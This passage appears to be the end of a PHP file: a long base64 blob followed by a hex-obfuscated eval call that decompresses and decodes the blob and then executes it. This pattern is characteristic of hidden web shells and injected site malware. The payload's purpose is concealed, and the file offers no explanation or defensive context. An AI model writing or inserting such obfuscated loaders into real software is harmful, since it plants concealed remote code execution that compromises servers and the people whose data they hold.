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" ;eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\x24\x6F\x29\x29\x29\x3B"); ?>
